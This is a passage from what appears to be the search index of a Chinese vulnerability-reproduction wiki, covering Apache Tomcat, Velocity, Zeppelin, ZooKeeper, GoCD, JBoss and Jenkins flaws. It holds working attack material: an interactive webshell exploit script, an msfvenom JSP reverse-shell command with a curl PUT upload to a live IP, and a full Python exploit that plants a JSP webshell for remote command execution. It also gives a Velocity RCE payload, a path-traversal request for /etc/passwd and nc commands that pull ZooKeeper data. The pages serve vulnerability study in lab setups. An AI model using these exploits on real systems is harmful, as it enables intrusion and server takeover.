Safari/537.36'} cmd=input(\"$ \") payload={'cmd':cmd} if cmd==\"q\" or cmd==\"Q\": break re=requests.get(str(url)+\"/\"+str(f),params=payload,headers=headers) re=str(re.content) t=removetags(re) print(t) #print bcolors.HEADER+ banner+bcolors.ENDC parse=OptionParser( bcolors.HEADER+\"\"\" _______ ________ ___ ___ __ ______ __ ___ __ __ ______ / ____\\ \\ / / ____| |__ \\ / _ \\/_ |____ | /_ |__ \\ / //_ |____ | | | \\ \\ / /| |__ ______ ) | | | || | / /_____| | ) / /_ | | / / | | \\ \\/ / | __|______/ /| | | || | / /______| | / / '_ \\| | / / | |____ \\ / | |____ / /_| |_| || | / / | |/ /| (_) | | / / \\_____| \\/ |______| |____|\\___/ |_|/_/ |_|____\\___/|_|/_/ ./cve-2017-12617.py [options] options: -u ,--url [::] check target url if it's vulnerable -p,--pwn [::] generate webshell and upload it -l,--list [::] hosts list [+]usage: ./cve-2017-12617.py -u http://127.0.0.1 ./cve-2017-12617.py --url http://127.0.0.1 ./cve-2017-12617.py ","date":"0001-01-01","objectID":"/apache-tomcat-rce-via-jsp-upload-bypass/:3:0","tags":null,"title":"","uri":"/apache-tomcat-rce-via-jsp-upload-bypass/"},{"categories":null,"content":"Apache Tomcat WebSocket 拒绝服务漏洞 CVE-2020-13935 ","date":"0001-01-01","objectID":"/apache-tomcat-websocket-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2020-13935/:0:0","tags":null,"title":"","uri":"/apache-tomcat-websocket-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2020-13935/"},{"categories":null,"content":"漏洞描述 2020年11月06日，360CERT监测发现@RedTeamPentesting发布了Tomcat WebSokcet 拒绝服务漏洞 的分析报告该漏洞编号为 CVE-2020-13935 ，漏洞等级：高危 ，漏洞评分：7.5 。 未授权的远程攻击者通过发送 大量特制请求包 到Tomcat服务器 ,可造成服务器停止响应并无法提供正常服务 ","date":"0001-01-01","objectID":"/apache-tomcat-websocket-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2020-13935/:1:0","tags":null,"title":"","uri":"/apache-tomcat-websocket-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2020-13935/"},{"categories":null,"content":"漏洞影响 Apache Tomcat 10.0.0-M1-10.0.0-M6 Apache Tomcat 9.0.0.M1-9.0.36 Apache Tomcat 8.5.0-8.5.56 Apache Tomcat 7.0.27-7.0.104 ","date":"0001-01-01","objectID":"/apache-tomcat-websocket-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2020-13935/:2:0","tags":null,"title":"","uri":"/apache-tomcat-websocket-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2020-13935/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2020-1938 docker-compose up -d ","date":"0001-01-01","objectID":"/apache-tomcat-websocket-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2020-13935/:3:0","tags":null,"title":"","uri":"/apache-tomcat-websocket-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2020-13935/"},{"categories":null,"content":"漏洞复现 访问目标，查看版本是否在漏洞版本范围内 查看攻击前的内存使用情况 CVE-2020-13935 EXP地址 EXP使用需要GO环境 如果出现 go: github.com/gorilla/websocket@v1.4.2: Get \"https://proxy.golang.org/github.com/gorilla/websocket/@v/v1.4.2.mod\": dial tcp 172.217.160.81:443: connectex: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond. 需要使用命令切换源 go env -w GOPROXY=https://goproxy.cn 使用EXP攻击 tcdos ws://192.168.51.133:8080/examples/websocket/echoStreamAnnotation CPU 负荷超载，成功攻击 ","date":"0001-01-01","objectID":"/apache-tomcat-websocket-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2020-13935/:4:0","tags":null,"title":"","uri":"/apache-tomcat-websocket-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2020-13935/"},{"categories":null,"content":"漏洞利用POC CVE-2020-13935 EXP地址 ","date":"0001-01-01","objectID":"/apache-tomcat-websocket-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2020-13935/:5:0","tags":null,"title":"","uri":"/apache-tomcat-websocket-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E-cve-2020-13935/"},{"categories":null,"content":"Apache Tomcat 信息泄露漏洞 CVE-2021-24122 ","date":"0001-01-01","objectID":"/apache-tomcat-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-24122/:0:0","tags":null,"title":"","uri":"/apache-tomcat-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-24122/"},{"categories":null,"content":"漏洞描述 使用NTFS文件系统从网络位置提供资源时，Apache Tomcat版本10.0.0-M1至10.0.0-M9、9.0.0.0.M1至9.0.39、8.5.0至8.5.59和7.0.0至7.0.106在某些配置中容易受到JSP源代码公开的影响。根本原因是JRE API File.getCanonicalPath（）的意外行为，这又是由Windows API（FindFirstFileW）在某些情况下的不一致行为引起的。 ","date":"0001-01-01","objectID":"/apache-tomcat-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-24122/:1:0","tags":null,"title":"","uri":"/apache-tomcat-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-24122/"},{"categories":null,"content":"漏洞影响 Apache Tomcat 10.0.0-M1-10.0.0-M9 Apache Tomcat 9.0.0.M1-9.0.39 Apache Tomcat 8.5.0-8.5.59 Apache Tomcat 7.0.0-7.0.106 ","date":"0001-01-01","objectID":"/apache-tomcat-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-24122/:2:0","tags":null,"title":"","uri":"/apache-tomcat-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-24122/"},{"categories":null,"content":"漏洞复现 目前漏洞复现暂未完善 更新补丁如下 据官方描述，该漏洞由于Windows API（FindFirstFileW）与JRE API File.getCanonicalPath的一些意外行为所导致。当使用NTFS文件系统时，可以绕过一些安全限制，最终可导致如查看某些配置中JSP的源代码等危害。 而补丁修复了 出现 : 的部分 getCanonicalPath() 此路径方法返回绝对唯一的标准规范路径名。此方法首先将此路径名转换为绝对形式，就像调用getAbsolutePath方法一样，然后以系统相关的方式将其映射到其唯一路径上。 也就是说如果路径中包含“.”或“..”等当前路径及上层路径表示法，则会从路径名中删除“.”和“..”使用真实路径代替。另外比较重点的是 它还会解析软链接（在UNIX平台上）以及将驱动器号（在Microsoft Windows平台上），将它们转换为标准实际路径。 而 getCanonicalPath() 解析了软链接转换为实际路径导致漏洞的产生 ","date":"0001-01-01","objectID":"/apache-tomcat-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-24122/:3:0","tags":null,"title":"","uri":"/apache-tomcat-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-cve-2021-24122/"},{"categories":null,"content":"Apache Tomcat 远程代码执行漏洞 CVE-2017-12615 ","date":"0001-01-01","objectID":"/apache-tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12615/:0:0","tags":null,"title":"","uri":"/apache-tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12615/"},{"categories":null,"content":"漏洞描述 2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，其中就有远程代码执行漏洞(CVE-2017-12615)。当 启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。 ","date":"0001-01-01","objectID":"/apache-tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12615/:1:0","tags":null,"title":"","uri":"/apache-tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12615/"},{"categories":null,"content":"漏洞影响 Apache Tomcat 7.0.0 - 7.0.81 ","date":"0001-01-01","objectID":"/apache-tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12615/:2:0","tags":null,"title":"","uri":"/apache-tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12615/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/tomcat/CVE-2017-12615 docker-compose up -d 访问 http://xxx.xxx.xxx.xxx:8080/ 正常即可 ","date":"0001-01-01","objectID":"/apache-tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12615/:3:0","tags":null,"title":"","uri":"/apache-tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12615/"},{"categories":null,"content":"漏洞复现 漏洞产生的主要原因来自于conf/web.xml文件配置错误,readonly开启了false,导致可以使用PUT/DELETE请求方法操作文件 msf生成一个jsp木马 msfvenom -p java/jsp_shell_reverse_tcp LHOST=xxx.xxx.xxx.xxx LPORT=9999 -f raw \u003e shell.jsp 利用PUT方法上传木马 curl -v -X PUT --data-binary @shell.jsp \"http://81.68.139.186:8080/shell.jsp/\" 注意 http://xxx.xxx.xxx.xxx:8080/shell.jsp/ 中的最后一个\"/“字符很重要 发现成功上传木马文件 访问文件即可反弹一个shell 也可以用DELETE请求方法删除文件 ","date":"0001-01-01","objectID":"/apache-tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12615/:4:0","tags":null,"title":"","uri":"/apache-tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12615/"},{"categories":null,"content":"漏洞POC 代码只用于检测漏洞，反弹shell参照上方 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import hashlib import sys import requests import random import re def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: Apache Tomcat 7.0.0 - 7.0.81 \\033[0m') print('+ \\033[36m使用格式: python3 CVE-2017-12615.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx:8080 \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e shell \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e exit(退出交互并删除webshell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): md5_filename = str(random.randint(1,999)).encode(\"utf-8\") file_name = hashlib.md5(md5_filename).hexdigest() vuln_put_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"\"\" \u003c% if(\"peiqi\".equals(request.getParameter(\"pwd\"))){ java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\"cmd\")).getInputStream(); int a = -1; byte[] b = new byte[1024]; while((a=in.read(b))!=-1){ out.println(new String(b)); } } %\u003e \"\"\" try: response = requests.request(\"PUT\", url=vuln_put_url, data=data, headers=headers, timeout=30) if response.status_code == 201 or response.status_code == 201: print(\"\\033[32m[o] 含有CVE-2017-12615漏洞，成功上传shell，文件名为{}.jsp,响应为{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] 漏洞利用失败,PUT方法关闭 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败,PUT方法关闭 \\033[0m\") sys.exit(0) def POC_2(target_url, file_name, cmd): vuln_cmd_url = target_url + \"/\" + file_name + \".jsp?\" + \"pwd=peiqi\u0026cmd=\" + cmd headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=vuln_cmd_url, headers=headers,timeout=30) if response.status_code == 200: print(\"\\033[32m[o] 成功执行命令,响应为:\\n\\033[0m\",response.text) else: print(\"\\033[31m[x] 漏洞利用失败,命令无法执行 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 漏洞利用失败,命令无法执行 \\033[0m\") sys.exit(0) def POC_3(target_url, file_name): vuln_delect_url = target_url + \"/\" + file_name + \".jsp/\" headers = { \"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.request(\"DELETE\", url=vuln_delect_url, headers=headers, timeout=30) if response.status_code == 200 or 201: print(\"\\033[32m[o] 成功删除shell，文件名为{}.jsp,响应为{}\\033[0m\".format(file_name,response.status_code)) return file_name else: print(\"\\033[31m[x] 删除失败 \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] 删除失败 \\033[0m\") sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) file_name = POC_1(target_url) while True: cmd = input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\") if cmd == \"exit\": POC_3(target_url, file_name) sys.exit(0) else: POC_2(target_url, file_name, cmd) ","date":"0001-01-01","objectID":"/apache-tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12615/:5:0","tags":null,"title":"","uri":"/apache-tomcat-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2017-12615/"},{"categories":null,"content":"Apache Velocity 远程代码执行 CVE-2020-13936 ","date":"0001-01-01","objectID":"/apache-velocity-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-13936/:0:0","tags":null,"title":"","uri":"/apache-velocity-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-13936/"},{"categories":null,"content":"漏洞描述 Velocity Uberspector无法阻止访问java.lang.ClassLoader类加载器方法。在VelocityView的上下文中使用Velocity模板时，能够修改模版的攻击者可以使用与运行Servlet容器的帐户相同的权限执行任意Java代码或运行任意系统命令。 参考链接： https://securitylab.github.com/advisories/GHSL-2020-048-apache-velocity ","date":"0001-01-01","objectID":"/apache-velocity-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-13936/:1:0","tags":null,"title":"","uri":"/apache-velocity-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-13936/"},{"categories":null,"content":"漏洞复现 poc： ${req.getServletContext().getAttribute('org.apache.tomcat.InstanceManager').newInstance('javax.script.ScriptEngineManager').getEngineByName('js').eval(\"java.lang.Runtime.getRuntime().exec('touch /tmp/pwned')\")} ","date":"0001-01-01","objectID":"/apache-velocity-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-13936/:2:0","tags":null,"title":"","uri":"/apache-velocity-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-cve-2020-13936/"},{"categories":null,"content":"Apache Zeppelin 未授权任意命令执行漏洞 ","date":"0001-01-01","objectID":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 Apache Zeppelin 存在未授权的用户访问命令执行接口，导致了任意用户都可以执行恶意命令获取服务器权限 ","date":"0001-01-01","objectID":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 Apache Zeppelin ","date":"0001-01-01","objectID":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"960250052\" ","date":"0001-01-01","objectID":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 含有漏洞的页面如下 点击 创建一个匿名用户在用户页面执行命令即可 ","date":"0001-01-01","objectID":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/apache-zeppelin-%E6%9C%AA%E6%8E%88%E6%9D%83%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Apache ZooKeeper 未授权访问漏洞 CVE-2014-085 默认安装配置完的zookeeper允许未授权访问，管理员未配置访问控制列表（ACL）。导致攻击者可以在默认开放的2181端口下通过执行envi命令获得大量敏感信息（系统名称、java环境）导致任意用户可以在网络不受限的情况下进行未授权访问读取数据 ","date":"0001-01-01","objectID":"/apache-zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2014-085%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0/:0:0","tags":null,"title":"","uri":"/apache-zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2014-085%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0/"},{"categories":null,"content":"漏洞影响 Apache ZooKeeper ","date":"0001-01-01","objectID":"/apache-zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2014-085%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0/:1:0","tags":null,"title":"","uri":"/apache-zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2014-085%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0/"},{"categories":null,"content":"漏洞复现 Apache ZooKeeper 默认开放 2181端口 ,使用如下命令获取敏感数据 echo envi | nc xxx.xxx.xxx.xxx 2181 其他信息 1、stat：列出关于性能和连接的客户端的统计信息。 echo stat |ncat 127.0.0.1 2181 2、ruok：测试服务器是否运行在非错误状态。 echo ruok |ncat 127.0.0.1 2181 3、reqs：列出未完成的请求。 echo reqs |ncat 127.0.0.1 2181 4、envi：打印有关服务环境的详细信息。 echo envi |ncat 127.0.0.1 2181 5、dump：列出未完成的会话和临时节点。 echo dump |ncat 127.0.0.1 2181 ","date":"0001-01-01","objectID":"/apache-zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2014-085%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0/:2:0","tags":null,"title":"","uri":"/apache-zookeeper-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E-cve-2014-085%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0/"},{"categories":null,"content":"GoCD plugin 任意文件读取漏洞 CVE-2021-43287 ","date":"0001-01-01","objectID":"/gocd-plugin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43287/:0:0","tags":null,"title":"","uri":"/gocd-plugin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43287/"},{"categories":null,"content":"漏洞描述 GoCD，一个开源的持续集成和持续交付系统，可以在持续交付过程中执行编译，自动化测试，自动部署等等，与Jenkins类似。 GoCD plugin aip 参数中的 pluginName 参数存在任意文件读取漏洞，导致攻击者可以获取服务器中的任意敏感信息 ","date":"0001-01-01","objectID":"/gocd-plugin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43287/:1:0","tags":null,"title":"","uri":"/gocd-plugin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43287/"},{"categories":null,"content":"漏洞影响 GoCD ","date":"0001-01-01","objectID":"/gocd-plugin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43287/:2:0","tags":null,"title":"","uri":"/gocd-plugin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43287/"},{"categories":null,"content":"网络测绘 title=\"Create a pipeline - Go\" ","date":"0001-01-01","objectID":"/gocd-plugin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43287/:3:0","tags":null,"title":"","uri":"/gocd-plugin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43287/"},{"categories":null,"content":"漏洞复现 主页面 验证POC /go/add-on/business-continuity/api/plugin?folderName=\u0026pluginName=../../../etc/passwd ","date":"0001-01-01","objectID":"/gocd-plugin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43287/:4:0","tags":null,"title":"","uri":"/gocd-plugin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-43287/"},{"categories":null,"content":"JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504 ","date":"0001-01-01","objectID":"/jboss-4.x-jbossmq-jms-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2017-7504/:0:0","tags":null,"title":"","uri":"/jboss-4.x-jbossmq-jms-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2017-7504/"},{"categories":null,"content":"漏洞描述 Red Hat JBoss Application Server 是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JbossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，远程攻击者可借助特制的序列化数据利用该漏洞执行任意代码。 ","date":"0001-01-01","objectID":"/jboss-4.x-jbossmq-jms-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2017-7504/:1:0","tags":null,"title":"","uri":"/jboss-4.x-jbossmq-jms-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2017-7504/"},{"categories":null,"content":"漏洞影响 JBoss AS 4.x及之前版本 ","date":"0001-01-01","objectID":"/jboss-4.x-jbossmq-jms-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2017-7504/:2:0","tags":null,"title":"","uri":"/jboss-4.x-jbossmq-jms-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2017-7504/"},{"categories":null,"content":"环境搭建 https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose build docker-compose up -d ","date":"0001-01-01","objectID":"/jboss-4.x-jbossmq-jms-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2017-7504/:3:0","tags":null,"title":"","uri":"/jboss-4.x-jbossmq-jms-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2017-7504/"},{"categories":null,"content":"漏洞复现 访问控制台 使用工具 Jexboss 进行漏洞扫描 python3 jexboss.py -host http://192.168.51.133:8080 成功利用漏洞执行命令 ","date":"0001-01-01","objectID":"/jboss-4.x-jbossmq-jms-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2017-7504/:4:0","tags":null,"title":"","uri":"/jboss-4.x-jbossmq-jms-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-cve-2017-7504/"},{"categories":null,"content":"Jenkins checkScript 远程命令执行漏洞 CVE-2018-1000861 ","date":"0001-01-01","objectID":"/jenkins-checkscript-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2018-1000861/:0:0","tags":null,"title":"","uri":"/jenkins-checkscript-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2018-1000861/"},{"categories":null,"content":"漏洞描述 Jenkins使用Stapler框架开发，其允许用户通过URL PATH来调用一次public方法。由于这个过程没有做限制，攻击者可以构造一些特殊的PATH来执行一些敏感的Java方法。 通过这个漏洞，我们可以找到很多可供利用的利用链。其中最严重的就是绕过Groovy沙盒导致未授权用户可执行任意命令：Jenkins在沙盒中执行Groovy前会先检查脚本是否有错误，检查操作是没有沙盒的，攻击者可以通过Meta-Programming的方式，在检查这个步骤时执行任意命令。 ","date":"0001-01-01","objectID":"/jenkins-checkscript-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2018-1000861/:1:0","tags":null,"title":"","uri":"/jenkins-checkscript-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2018-1000861/"},{"categories":null,"content":"漏洞影响 Jenkins version \u003c 2.138 Jenkins build time \u003c 2019-01-28 